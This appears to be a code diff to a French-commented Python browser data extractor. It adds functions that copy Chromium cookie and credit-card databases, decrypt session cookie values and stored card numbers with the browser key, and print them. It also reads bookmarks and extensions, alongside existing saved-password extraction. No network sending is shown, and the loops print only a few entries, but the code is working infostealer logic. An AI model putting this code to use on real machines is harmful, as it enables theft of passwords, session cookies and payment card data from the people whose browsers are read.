@@ -73,7 +73,7 @@ def get_encryption_key(local_state_path):
         return None
 
 # Fonction pour déchiffrer un mot de passe
-def decrypt_password(encrypted_password, key):
+def decrypt_value(encrypted_password, key):
     try:
         if encrypted_password[:3] != b"v10":
             return "Format inconnu"
@@ -121,7 +121,7 @@ def extract_passwords(browser: Browser, profile: Profile = None):
                 username,
                 encrypted_password,
             ) in cursor.fetchall():
-                password = decrypt_password(encrypted_password, browser.encryption_key)
+                password = decrypt_value(encrypted_password, browser.encryption_key)
                 if password and password != "Format inconnu":
                     print(f"[🌍] URL d'origine: {origin_url}")
                     print(f"[🌍] URL de login: {action_url}")
@@ -222,6 +222,181 @@ def extract_download_history(browser, profile: Profile = None):
     except Exception as e:
         print(f"❌ Erreur extraction {browser} : {e}")
 
+# Extraction des cookies impossible des cookies en V20 impossible, on essaie de récupérer les cookies en V10 si il y en a
+def extract_cookies(browser, profile: Profile = None):
+    print(f"Extraction des cookies")
+    if profile:
+        cookies_db = profile.profile_path / CHROMIUM_BROWSERS["db"]["cookies"]
+    else:
+        cookies_db = browser.user_data_path / CHROMIUM_BROWSERS["db"]["cookies"]
+
+        if not cookies_db.exists():
+            print(f"❌ Fichier de cookies non présent")
+            return
+
+    # Copie temporaire du fichier de cookies
+    temp_db = cookies_db.with_suffix(".temp")
+
+    try:
+        shutil.copy(cookies_db, temp_db)
+    except Exception as e:
+        print(f"❌ Erreur copie fichier de cookies : {e}")
+        return
+
+    try:
+        conn = sqlite3.connect(str(temp_db))
+        cursor = conn.cursor()
+        cursor.execute(
+            "SELECT name, cast(encrypted_value AS BLOB), host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies"
+        )
+
+        counter = 0
+        for name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent in cursor.fetchall():
+            if encrypted_value[:3] == b"v10":
+                decrypted_value = decrypt_value(encrypted_value, browser.encryption_key)
+                print(f"[🍪] Nom: {name}")
+                print(f"[🔑] Valeur: {decrypted_value}")
+                print(f"[🌍] Domaine: {host_key}")
+                print(f"[📂] Chemin: {path}")
+                print(f"[🕒] Création: {creation_utc}")
+                print(f"[🕒] Expiration: {expires_utc}")
+                print(f"[🔒] Sécurisé: {is_secure}")
+                print(f"[🔒] HttpOnly: {is_httponly}\n")
+                counter += 1
+                if counter > 2:
+                    break
+        conn.close()
+        os.remove(temp_db)
+
+    except Exception as e:
+        print(f"❌ Erreur extraction {browser} : {e}\n")
+
+# Fonction pour extraire les favoris
+def extract_bookmarks(browser, profile: Profile = None):
+    print(f"Extraction des favoris")
+    if profile:
+        bookmarks_db = profile.profile_path / CHROMIUM_BROWSERS["db"]["bookmarks"]
+    else:
+        bookmarks_db = browser.user_data_path / CHROMIUM_BROWSERS["db"]["bookmarks"]
+
+    if not bookmarks_db.exists():
+        print(f"❌ Fichier de favoris non présent")
+        return
+
+    # Copie temporaire du fichier de favoris
+    temp_db = bookmarks_db.with_suffix(".temp")
+    shutil.copy(bookmarks_db, temp_db)
+
+    try:
+        with open(temp_db, "r", encoding="utf-8") as file:
+            bookmarks = json.load(file)
+                
+            print(bookmarks)
+
+        os.remove(temp_db)
+
+    except Exception as e:
+        print(f"❌ Erreur extraction {browser} : {e}")
+
+# Fonction pour extraire les extensions
+def extract_extensions(browser, profile: Profile = None):
+    print(f"Extraction des extensions")
+    if profile:
+        extensions_path = profile.profile_path / CHROMIUM_BROWSERS["db"]["extensions"]
+    else:
+        extensions_path = browser.user_data_path / CHROMIUM_BROWSERS["db"]["extensions"]
+
+    if not extensions_path.exists():
+        print(f"❌ Dossier d'extensions non présent")
+        return
+
+    # Copie temporaire du dossier d'extensions
+    temp_db = extensions_path.with_suffix(".temp")
+    try:
+        shutil.copytree(extensions_path, temp_db)
+        extensions = []
+        for content in temp_db.iterdir():
+            if content.is_dir():
+                id = content.name
+                for root, _, files in os.walk(content):
+                    for file in files:
+                        if file == "manifest.json":
+                            manifest_file = os.path.join(root, file)
+                            with open(manifest_file, "r", encoding="utf-8") as file:
+                                manifest_content = json.load(file)
+                                extensions.append(parse_chromium_extension(manifest_content, id))
+    except Exception as e:
+        print(f"❌ Erreur extraction : {e}")
+    finally:
+        shutil.rmtree(temp_db, ignore_errors=True)
+
+# Récupération des données d'une extension
+def parse_chromium_extension(manifest_content, id) -> dict:
+    keys = ["name", "version", "description", "update_url", "homepage_url"]
+    extension_data = {}
+    
+    for key in keys:
+        if key in manifest_content:
+            if key == "update_url":
+                extension_data[key] = get_chromium_ext_url(id, manifest_content[key])
+            else:
+                extension_data[key] = manifest_content[key]
+                
+    extension_data["id"] = id
+    extension_data["enabled"] = manifest_content.get("disable_reasons", True)
+    return extension_data
+
+# Récupération de l'url de l'extension
+def get_chromium_ext_url(id, update_url):
+    if update_url and update_url.endswith("clients2.google.com/service/update2/crx"):
+        return "https://chrome.google.com/webstore/detail/" + id
+    elif update_url and update_url.endswith(
+        "edge.microsoft.com/extensionwebstorebase/v1/crx"
+    ):
+        return "https://microsoftedge.microsoft.com/addons/detail/" + id
+    return ""
+
+# Fonction pour extraire les cartes de crédit
+# @TODO : Tester
+def extract_credit_cards(browser, profile: Profile = None):
+    print(f"Extraction des cartes de crédit")
+    if profile:
+        credit_cards_db = profile.profile_path / CHROMIUM_BROWSERS["db"]["credit_cards"]
+    else:
+        credit_cards_db = browser.user_data_path / CHROMIUM_BROWSERS["db"]["credit_cards"]
+
+    if not credit_cards_db.exists():
+        print(f"❌ Fichier de cartes de crédit non présent")
+        return
+
+    # Copie temporaire du fichier de cartes de crédit
+    temp_db = credit_cards_db.with_suffix(".temp")
+    shutil.copy(credit_cards_db, temp_db)
+
+    try:
+        conn = sqlite3.connect(str(temp_db))
+        cursor = conn.cursor()
+        cursor.execute(
+            "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
+        )
+
+        counter = 0
+        for name_on_card, expiration_month, expiration_year, encrypted_card_number in cursor.fetchall():
+            card_number = decrypt_value(encrypted_card_number, browser.encryption_key)
+            print(f"[💳] Nom sur la carte: {name_on_card}")
+            print(f"[📅] Mois d'expiration: {expiration_month}")
+            print(f"[📅] Année d'expiration: {expiration_year}")
+            print(f"[🔑] Numéro de carte: {card_number}\n")
+            counter += 1
+            if counter > 2:
+                break
+
+        conn.close()
+        os.remove(temp_db)
+
+    except Exception as e:
+        print(f"❌ Erreur extraction {browser} : {e}")
+
 # Fonction pour extraire les données
 def extract_data():
     list_browsers()
@@ -248,9 +423,17 @@ def extract_data():
             extract_passwords(browser)
             extract_history(browser)
             extract_download_history(browser)
+            extract_cookies(browser)
+            extract_bookmarks(browser)
+            extract_extensions(browser)
+            extract_credit_cards(browser)
         else:
             for profile in browser.profiles:
                 print(f"🔍 Extraction des données pour le profil {profile} sur le navigateur {browser}")
                 extract_passwords(browser, profile)
                 extract_history(browser, profile)
                 extract_download_history(browser, profile)
+                extract_cookies(browser, profile)
+                extract_bookmarks(browser, profile)
+                extract_extensions(browser, profile)
+                extract_credit_cards(browser, profile)
